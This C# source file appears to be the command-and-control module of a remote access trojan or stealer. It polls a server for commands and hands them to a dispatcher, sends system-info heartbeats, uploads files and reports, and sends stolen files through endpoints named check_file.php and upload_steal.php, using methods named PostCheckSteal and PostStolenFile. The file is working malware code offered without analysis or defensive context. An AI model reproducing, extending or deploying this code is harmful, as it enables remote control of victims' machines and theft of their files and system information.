using System;
using System.Buffers.Text;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using True.Features;

namespace True.Core
{
    public static class Communicator
    {
        private static string baseUrl;
        private static int intervalMs;
        private static string clientId;

        private static readonly HttpClient httpClient = new HttpClient
        {
            Timeout = TimeSpan.FromSeconds(30)
        };

        private static CancellationTokenSource cts = new CancellationTokenSource();
        private static readonly object initLock = new object();
        private static bool initialized = false;
        private static int heartbeatIntervalMs;
        private static int commandIntervalMs;

        public static void Init()
        {
            lock (initLock)
            {
                if (initialized) return;

                var serverUrl = ConfigManager.Get("General", "server_url", "http://localhost/");
                baseUrl = NormalizeUrl(serverUrl) + "backend/api/";

                int heartbeatSeconds = ConfigManager.GetInt("General", "heartbeat_interval", 7200);
                heartbeatIntervalMs = Math.Max(1000, heartbeatSeconds * 1000);

                int commandSeconds = ConfigManager.GetInt("General", "command_interval", 30);
                commandIntervalMs = Math.Max(1000, commandSeconds * 1000);

                clientId = ConfigManager.Get("General", "client_id", "client1");

                initialized = true;
                Logger.Info("Communicator", $"Initialized → {baseUrl} heartbeat every {heartbeatIntervalMs}ms, commands every {commandIntervalMs}ms (client: {clientId})");
            }
        }

        private static void EnsureInitialized()
        {
            if (!initialized)
                throw new InvalidOperationException("Communicator.Init() must be called before using this method.");
        }

        private static string NormalizeUrl(string url)
        {
            if (string.IsNullOrWhiteSpace(url)) return "http://localhost/";
            return url.EndsWith("/") ? url : url + "/";
        }

      

        public static async Task StartAsync()
        {
        EnsureInitialized();
        Logger.Info("Communicator", $"Started loop → {baseUrl}ping.php (every {intervalMs}ms)");

        int backoffMs = 1000;

        while (!cts.Token.IsCancellationRequested)
        {
            try
            {
                using var payload = new FormUrlEncodedContent(new[]
                {
                new KeyValuePair<string, string>("id", clientId)
            });

                using var ctsRequest = CancellationTokenSource.CreateLinkedTokenSource(cts.Token);
                ctsRequest.CancelAfter(TimeSpan.FromSeconds(15));

                HttpResponseMessage response = await httpClient.PostAsync(baseUrl + "ping.php", payload, ctsRequest.Token);

                if (!response.IsSuccessStatusCode)
                {
                    Logger.Warn("Communicator", $"Server error: {response.StatusCode} → {response.ReasonPhrase}");
                    await Task.Delay(Math.Min(backoffMs, intervalMs), cts.Token);
                    backoffMs = Math.Min(backoffMs * 2, 30000);
                    continue;
                }

                string result = await response.Content.ReadAsStringAsync();

                if (string.IsNullOrWhiteSpace(result))
                {
                    Logger.Debug("Communicator", "No commands received.");
                    backoffMs = 1000;
                    await Task.Delay(intervalMs, cts.Token);
                    continue;
                }

                Logger.Info("Communicator", $"Received raw response: {result.Replace("\n", " | ")}");

                try
                {
                    using JsonDocument jsonDoc = JsonDocument.Parse(result);
                    JsonElement root = jsonDoc.RootElement;

                    if (root.TryGetProperty("command", out JsonElement commandElem))
                    {
                        string command = commandElem.GetString();

                        if (!string.IsNullOrWhiteSpace(command))
                        {
                            Logger.Info("Communicator", $"Dispatching command: {command}");
                            await CommandDispatcher.Dispatch(command);
                        }
                        else
                        {
                            Logger.Info("Communicator", "Command is null or empty, skipping dispatch.");
                        }
                    }
                    else
                    {
                        Logger.Warn("Communicator", "JSON response missing 'command' property.");
                    }
                }
                catch (JsonException ex)
                {
                    Logger.Warn("Communicator", $"Failed to parse JSON response: {ex.Message}");
                }

                backoffMs = 1000;
            }
            catch (TaskCanceledException)
            {
                if (cts.Token.IsCancellationRequested) break;
                Logger.Warn("Communicator", "Request timed out.");
            }
            catch (HttpRequestException hre)
            {
                Logger.Error("Communicator", $"HTTP error: {hre.Message}");
            }
            catch (Exception ex)
            {
                Logger.Error("Communicator", $"Unexpected error: {ex.Message}");
            }

            try
            {
                await Task.Delay(intervalMs, cts.Token);
            }
            catch (TaskCanceledException) { break; }
        }

        Logger.Info("Communicator", "Stopped loop.");
    }


    public static void Stop()
        {
            if (!cts.IsCancellationRequested)
            {
                cts.Cancel();
            }
        }

        public static async Task PostResponse(string type, string data)
        {
            EnsureInitialized();

            try
            {
                using var content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("type", type),
                    new KeyValuePair<string, string>("id", clientId),
                    new KeyValuePair<string, string>("data", data)
                });

                HttpResponseMessage response = await httpClient.PostAsync(baseUrl + "report.php", content);
                Logger.Info("Communicator", $"Report sent → {type} : {response.StatusCode}");
            }
            catch (Exception ex)
            {
                Logger.Error("Communicator", $"Failed to post response: {ex.Message}");
            }
        }

        public static async Task PostFile(string type, byte[] data, string filename)
        {
            EnsureInitialized();

            try
            {
                using var content = new MultipartFormDataContent();
                content.Add(new StringContent(type), "type");
                content.Add(new StringContent(clientId), "id");
                content.Add(new ByteArrayContent(data), "file", filename);

                HttpResponseMessage response = await httpClient.PostAsync(baseUrl + "report.php", content);

                Logger.Info("Communicator", $"File '{filename}' posted → Status: {response.StatusCode}");
            }
            catch (Exception ex)
            {
                Logger.Error("Communicator", $"Failed to upload file: {ex.Message}");
            }
        }

        public static async Task<string> PostCheckSteal(string payload)
        {
            EnsureInitialized();

            try
            {
                var kvData = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("data", payload)
                });

                HttpResponseMessage result = await httpClient.PostAsync(baseUrl + "check_file.php", kvData);

                string responseBody = await result.Content.ReadAsStringAsync();
                Logger.Info("Communicator", $"PostCheckSteal response → Status: {result.StatusCode}, Body: {responseBody}");

                return responseBody;
            }
            catch (Exception ex)
            {
                Logger.Error("Communicator", $"PostCheckSteal failed: {ex.Message}");
                return string.Empty;
            }
        }

        public static async Task PostStolenFile(byte[] content, string filename)
        {
            EnsureInitialized();

            try
            {
                string url = baseUrl + "upload_steal.php?filename=" + Uri.EscapeDataString(filename);
                using var data = new ByteArrayContent(content);
                HttpResponseMessage result = await httpClient.PostAsync(url, data);

                string responseBody = await result.Content.ReadAsStringAsync();
                Logger.Info("Communicator", $"PostStolenFile → {filename} → Status: {result.StatusCode}, Body: {responseBody}");
            }
            catch (Exception ex)
            {
                Logger.Error("Communicator", $"PostStolenFile failed: {ex.Message}");
            }
        }

        public static async Task StartHeartbeatAsync()
        {
            EnsureInitialized();
            Logger.Info("Communicator", $"Started heartbeat loop → {baseUrl}ping.php (every {heartbeatIntervalMs}ms)");

            int backoffMs = 1000;

            while (!cts.Token.IsCancellationRequested)
            {
                try
                {
                    var systemInfoJson = await SystemInfoReporter.GetSystemInfoString();

                    using var payload = new FormUrlEncodedContent(new[]
                    {
                new KeyValuePair<string, string>("id", clientId),
                new KeyValuePair<string, string>("sysinfo", systemInfoJson)
            });

                    HttpResponseMessage response = await httpClient.PostAsync(baseUrl + "ping.php", payload, cts.Token);

                    if (!response.IsSuccessStatusCode)
                    {
                        Logger.Warn("Communicator", $"Heartbeat server error: {response.StatusCode} → {response.ReasonPhrase}");
                        await Task.Delay(Math.Min(backoffMs, heartbeatIntervalMs), cts.Token);
                        backoffMs = Math.Min(backoffMs * 2, 30000);
                        continue;
                    }

                    string result = await response.Content.ReadAsStringAsync();

                    Logger.Debug("Communicator", $"Heartbeat response: {result}");
                    backoffMs = 1000;
                }
                catch (TaskCanceledException)
                {
                    if (cts.Token.IsCancellationRequested) break;
                    Logger.Warn("Communicator", "Heartbeat request timed out.");
                }
                catch (HttpRequestException hre)
                {
                    Logger.Error("Communicator", $"Heartbeat HTTP error: {hre.Message}");
                }
                catch (Exception ex)
                {
                    Logger.Error("Communicator", $"Heartbeat unexpected error: {ex.Message}");
                }

                try
                {
                    await Task.Delay(heartbeatIntervalMs, cts.Token);
                }
                catch (TaskCanceledException) { break; }
            }

            Logger.Info("Communicator", "Stopped heartbeat loop.");
        }


        public static async Task StartCommandPollingAsync()
        {
            EnsureInitialized();
            Logger.Info("Communicator", $"Started commands polling loop → {baseUrl}getCommands.php (every {commandIntervalMs}ms)");

            int backoffMs = 1000;

            while (!cts.Token.IsCancellationRequested)
            {
                try
                {
                    using var payload = new FormUrlEncodedContent(new[]
                    {
                new KeyValuePair<string, string>("id", clientId)
            });

                    HttpResponseMessage response = await httpClient.PostAsync(baseUrl + "getCommands.php", payload, cts.Token);

                    if (!response.IsSuccessStatusCode)
                    {
                        Logger.Warn("Communicator", $"Commands server error: {response.StatusCode} → {response.ReasonPhrase}");
                        await Task.Delay(Math.Min(backoffMs, commandIntervalMs), cts.Token);
                        backoffMs = Math.Min(backoffMs * 2, 30000);
                        continue;
                    }

                    string result = await response.Content.ReadAsStringAsync();

                    if (string.IsNullOrWhiteSpace(result))
                    {
                        Logger.Debug("Communicator", "No commands received.");
                        backoffMs = 1000;
                        await Task.Delay(commandIntervalMs, cts.Token);
                        continue;
                    }

                    Logger.Info("Communicator", $"Received commands: {result.Replace("\n", " | ")}");

                    try
                    {
                        using JsonDocument jsonDoc = JsonDocument.Parse(result);
                        JsonElement root = jsonDoc.RootElement;

                        if (root.TryGetProperty("command", out JsonElement commandElem))
                        {
                            string command = commandElem.GetString();

                            if (!string.IsNullOrWhiteSpace(command))
                            {
                                Logger.Info("Communicator", $"Dispatching command: {command}");
                                await CommandDispatcher.Dispatch(command);
                            }
                            else
                            {
                                Logger.Info("Communicator", "Command is null or empty, skipping dispatch.");
                            }
                        }
                        else
                        {
                            Logger.Warn("Communicator", "JSON response missing 'command' property.");
                        }
                    }
                    catch (JsonException ex)
                    {
                        Logger.Warn("Communicator", $"Failed to parse commands JSON response: {ex.Message}");
                    }

                    backoffMs = 1000;
                }
                catch (TaskCanceledException)
                {
                    if (cts.Token.IsCancellationRequested) break;
                    Logger.Warn("Communicator", "Commands request timed out.");
                }
                catch (HttpRequestException hre)
                {
                    Logger.Error("Communicator", $"Commands HTTP error: {hre.Message}");
                }
                catch (Exception ex)
                {
                    Logger.Error("Communicator", $"Commands unexpected error: {ex.Message}");
                }

                try
                {
                    await Task.Delay(commandIntervalMs, cts.Token);
                }
                catch (TaskCanceledException) { break; }
            }

            Logger.Info("Communicator", "Stopped commands polling loop.");
        }

    }
}
